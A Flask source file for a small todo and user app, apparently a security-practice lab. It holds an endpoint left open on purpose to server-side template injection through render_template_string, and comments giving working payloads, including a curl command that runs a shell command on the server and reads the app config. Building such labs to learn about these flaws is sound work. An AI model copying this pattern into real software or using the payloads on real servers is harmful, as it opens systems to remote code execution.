from flask import Flask, render_template
from flask import request
from flask import render_template_string
import flaskr.user_database as user_db
import flaskr.todo_list_database as todo
from markupsafe import escape
from pydantic import BaseModel, ValidationError



app = Flask(__name__)

# [{id:name},...]
user_db = user_db.user_db

# [{id:int,task:name,is_done:bool},...]
todo = [{"id": 2, "task": "Cook dinner", "is_done": False},
        {"id": 3, "task": "Read a book", "is_done": False}]

class ToDo(BaseModel):
    id:int
    task:str
    is_done:bool

# GET endpoint to return all todo items
@app.route("/")
def hello_world():
    print(todo)
    return render_template("home.html",todo_list=todo)

# POST endpoint that accepts a json obj and adds it to todo
@app.route("/add-todo", methods=["POST"])
def add_todo() -> dict:
    req = request.get_json()
    # if not isinstance(req, dict) or "is_done" not in req or "task" not in req:
    #     return "", 400
    try:
        validated_request = ToDo.model_validate(req)
    except ValidationError:
        return "get your shit together", 422

    
    todo.append(validated_request.model_dump())

    return validated_request.model_dump(), 201

# GET endpoint that returns all users
@app.route("/users")
def get_users():
    return user_db

# POST endpoint that creates a new user from request JSON
@app.route("/add-user", methods=["POST"])
def create_user():
    req = request.get_json()
    user_db.append(req)
    return user_db.pop(), 201








    

# XSS endpoint - test with http://localhost:5000/xss/%3Cimg%20src%3Dx%20onerror%3Dalert(%22bad%22)%3E
@app.route("/xss/<xss>")
def get_xssed(xss):
    print(xss)
    return f"got {escape(xss)}"


# server-side template injection endpoint with 
# calculate 7 * 7 with http://localhost:5000/server-injection/%7B%7B7*7%7D%7D
# return flask config file http://localhost:5000/server-injection/%7B%7Bconfig%7D%7D 
# from client terminal, run a terminal command on the server and return its output with:
# curl -g 'http://localhost:5000/server-injection/{{self.__init__.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
@app.route("/server-injection/<inj>")
def get_template_injected(inj):
    return render_template_string(f"got {inj}")


# TODO SQL injection endpoint